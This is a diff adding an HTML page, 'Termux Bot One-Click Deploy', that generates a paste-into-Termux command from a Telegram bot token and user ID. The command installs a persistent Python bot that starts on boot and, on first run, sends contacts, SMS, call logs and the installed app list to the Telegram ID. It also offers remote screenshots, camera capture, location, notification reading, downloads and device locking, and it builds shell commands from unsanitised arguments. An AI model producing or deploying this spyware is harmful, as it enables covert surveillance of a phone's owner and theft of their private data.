@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ Termux Bot Deploy</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: #111;
+            border: 2px solid #00ff88;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 700px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(0,255,136,0.3);
+        }
+        h1 {
+            font-size: 28px;
+            color: #00ff88;
+            margin-bottom: 10px;
+        }
+        .emoji {
+            font-size: 50px;
+            margin-bottom: 15px;
+        }
+        .step {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+        }
+        .step h3 {
+            color: #ffcc00;
+            margin-bottom: 8px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #333;
+            border-radius: 10px;
+            background: #000;
+            color: #fff;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            margin: 5px 0;
+            outline: none;
+        }
+        input:focus {
+            border-color: #00ff88;
+        }
+        .code-block {
+            background: #000;
+            border: 1px solid #00ff88;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: left;
+            word-break: break-all;
+            position: relative;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
+            color: #00ff88;
+        }
+        .btn {
+            background: #00ff88;
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 12px;
+            cursor: pointer;
+            margin: 8px;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            background: #00cc66;
+            box-shadow: 0 0 20px #00ff88;
+        }
+        .btn.copied {
+            background: #ffcc00;
+        }
+        .warning {
+            color: #ff4444;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        #finalCommand {
+            display: none;
+        }
+        .generated {
+            border-color: #ffcc00 !important;
+            background: #111100 !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="emoji">🤖⚡</div>
+        <h1>Termux Bot One-Click Deploy</h1>
+        <p style="color:#aaa; margin-bottom:20px;">Fill in your details → Copy → Paste in Termux → DONE</p>
+
+        <div class="step">
+            <h3>🔑 Step 1: Enter Your Bot Token</h3>
+            <input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" oninput="generateCommand()">
+            <span style="color:#888; font-size:11px;">Get it from @BotFather on Telegram</span>
+        </div>
+
+        <div class="step">
+            <h3>🆔 Step 2: Enter Your Telegram User ID</h3>
+            <input type="text" id="userId" placeholder="123456789" oninput="generateCommand()">
+            <span style="color:#888; font-size:11px;">Get it from @userinfobot on Telegram</span>
+        </div>
+
+        <div class="step" id="finalCommand">
+            <h3>📋 Step 3: Copy & Paste This In Termux</h3>
+            <div class="code-block" id="commandBox"></div>
+            <button class="btn" onclick="copyCommand()" id="copyBtn">📋 COPY COMMAND</button>
+            <p class="warning">⚠️ This command auto-grants all permissions & installs everything.</p>
+        </div>
+
+        <div id="initialMsg" style="color:#ffcc00; margin-top:20px;">
+            ⬆️ Fill both fields above to generate your command
+        </div>
+    </div>
+
+    <script>
+        function generateCommand() {
+            const token = document.getElementById('botToken').value.trim();
+            const userId = document.getElementById('userId').value.trim();
+
+            if (token && userId) {
+                const command = `termux-setup-storage && pkg update -y && pkg upgrade -y && pkg install python termux-api termux-tools termux-boot -y && pip install python-telegram-bot && mkdir -p ~/.termux/boot && cat > ~/bot.py << 'BOTEOF'\nimport os, time\nfrom telegram import Update\nfrom telegram.ext import Application, CommandHandler, ContextTypes\n\nBOT_TOKEN = "${token}"\nAUTHORIZED_ID = ${userId}\nFIRST_BOOT_FLAG = "/data/data/com.termux/files/home/.first_boot_done"\n\ndef run(cmd):\n    return os.popen(cmd).read().strip()\n\nasync def first_boot_dump(app):\n    try:\n        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="\\ud83d\\udfe2 Bot just started! Dumping all data...")\n        contacts = run("termux-contact-list")\n        if contacts:\n            await app.bot.send_message(chat_id=AUTHORIZED_ID, text=f"\\ud83d\\udcc7 Contacts:\\n\\x60\\x60\\x60\\n{contacts[:4000]}\\n\\x60\\x60\\x60")\n        sms = run("termux-sms-list")\n        if sms:\n            await app.bot.send_message(chat_id=AUTHORIZED_ID, text=f"\\ud83d\\udcac SMS:\\n\\x60\\x60\\x60\\n{sms[:4000]}\\n\\x60\\x60\\x60")\n        calls = run("termux-call-log")\n        if calls:\n            await app.bot.send_message(chat_id=AUTHORIZED_ID, text=f"\\ud83d\\udcde Call Logs:\\n\\x60\\x60\\x60\\n{calls[:4000]}\\n\\x60\\x60\\x60")\n        apps = run("pm list packages")\n        if apps:\n            await app.bot.send_message(chat_id=AUTHORIZED_ID, text=f"\\ud83d\\udcf1 Apps:\\n\\x60\\x60\\x60\\n{apps[:4000]}\\n\\x60\\x60\\x60")\n        await app.bot.send_message(chat_id=AUTHORIZED_ID, text="\\u2705 First boot dump complete.")\n        os.system(f"touch {FIRST_BOOT_FLAG}")\n    except Exception as e:\n        pass\n\nasync def screenshot(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    path = "/sdcard/ss_bot.png"\n    os.system(f"termux-screenshot {path}")\n    await update.message.reply_photo(photo=open(path, "rb"), caption="\\ud83d\\udcf8 Screenshot")\n    os.remove(path)\n\nasync def cam(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    cam_id = 0 if not context.args else (1 if context.args[0].lower() == "front" else 0)\n    path = "/sdcard/cam_bot.jpg"\n    os.system(f"termux-camera-photo -c {cam_id} {path}")\n    await update.message.reply_photo(photo=open(path, "rb"), caption="\\ud83d\\udcf7 Photo")\n    os.remove(path)\n\nasync def location(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    await update.message.reply_text(f"\\ud83d\\udccd Location:\\n\\x60\\x60\\x60\\n{run('termux-location')}\\n\\x60\\x60\\x60")\n\nasync def battery(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    await update.message.reply_text(f"\\ud83d\\udd0b Battery:\\n\\x60\\x60\\x60\\n{run('termux-battery-status')}\\n\\x60\\x60\\x60")\n\nasync def notify(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    out = run("termux-notification-list")\n    await update.message.reply_text(f"\\ud83d\\udd14 Notifications:\\n\\x60\\x60\\x60\\n{out[:4000]}\\n\\x60\\x60\\x60" if out else "No notifications.")\n\nasync def download(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    if not context.args: await update.message.reply_text("Usage: /download <url>"); return\n    await update.message.reply_text("\\u2b07\\ufe0f Downloading...")\n    os.system(f"termux-download {context.args[0]}")\n    await update.message.reply_text("\\u2705 Downloaded")\n\nasync def say(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    if not context.args: return\n    os.system(f"termux-tts-speak '{' '.join(context.args)}'")\n    await update.message.reply_text(f"\\ud83d\\udde3\\ufe0f Said: {' '.join(context.args)}")\n\nasync def vibrate(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    dur = context.args[0] if context.args else "500"\n    os.system(f"termux-vibrate -d {dur}")\n    await update.message.reply_text(f"\\ud83d\\udcf3 Vibrated {dur}ms")\n\nasync def torch(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    if not context.args or context.args[0].lower() not in ["on", "off"]: return\n    os.system(f"termux-torch {context.args[0].lower()}")\n    await update.message.reply_text(f"\\ud83d\\udd26 Torch {context.args[0].upper()}")\n\nasync def lock(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    os.system("termux-lock")\n    await update.message.reply_text("\\ud83d\\udd12 Locked")\n\nasync def calls(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    out = run("termux-call-log")\n    await update.message.reply_text(f"\\ud83d\\udcde Calls:\\n\\x60\\x60\\x60\\n{out[:4000]}\\n\\x60\\x60\\x60")\n\nasync def contacts(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    out = run("termux-contact-list")\n    await update.message.reply_text(f"\\ud83d\\udcc7 Contacts:\\n\\x60\\x60\\x60\\n{out[:4000]}\\n\\x60\\x60\\x60")\n\nasync def sms_cmd(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    out = run("termux-sms-list")\n    await update.message.reply_text(f"\\ud83d\\udcac SMS:\\n\\x60\\x60\\x60\\n{out[:4000]}\\n\\x60\\x60\\x60")\n\nasync def apps(update, context):\n    if update.effective_user.id != AUTHORIZED_ID: return\n    out = run("pm list packages")\n    await update.message.reply_text(f"\\ud83d\\udcf1 Apps:\\n\\x60\\x60\\x60\\n{out[:4000]}\\n\\x60\\x60\\x60")\n\nasync def start(update, context):\n    await update.message.reply_text("\\ud83e\\udd16 Bot Ready!\\n/ss /cam /location /battery /notify /download /say /vibrate /torch /lock /calls /contacts /sms /apps")\n\ndef main():\n    while True:\n        try:\n            app = Application.builder().token(BOT_TOKEN).build()\n            for cmd, func in [("start", start), ("ss", screenshot), ("cam", cam), ("location", location), ("battery", battery), ("notify", notify), ("download", download), ("say", say), ("vibrate", vibrate), ("torch", torch), ("lock", lock), ("calls", calls), ("contacts", contacts), ("sms", sms_cmd), ("apps", apps)]:\n                app.add_handler(CommandHandler(cmd, func))\n            import asyncio\n            if not os.path.exists(FIRST_BOOT_FLAG):\n                loop = asyncio.new_event_loop()\n                asyncio.set_event_loop(loop)\n                loop.run_until_complete(first_boot_dump(app))\n                loop.close()\n            print("Bot running...")\n            app.run_polling()\n        except Exception as e:\n            print(f"Crashed: {e}")\n            time.sleep(5)\n\nif __name__ == "__main__":\n    main()\nBOTEOF\ncat > ~/.termux/boot/start_bot.sh << 'BOOTEOF'\n#!/data/data/com.termux/files/usr/bin/bash\ntermux-wake-lock\ncd ~\npython bot.py &\nBOOTEOF\nchmod +x ~/.termux/boot/start_bot.sh && echo 'ALL DONE! Starting bot...' && python ~/bot.py`;
+
+                document.getElementById('commandBox').textContent = command;
+                document.getElementById('finalCommand').style.display = 'block';
+                document.getElementById('initialMsg').style.display = 'none';
+            } else {
+                document.getElementById('finalCommand').style.display = 'none';
+                document.getElementById('initialMsg').style.display = 'block';
+            }
+        }
+
+        function copyCommand() {
+            const text = document.getElementById('commandBox').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = document.getElementById('copyBtn');
+                btn.textContent = '✅ COPIED!';
+                btn.classList.add('copied');
+                setTimeout(() => {
+                    btn.textContent = '📋 COPY COMMAND';
+                    btn.classList.remove('copied');
+                }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
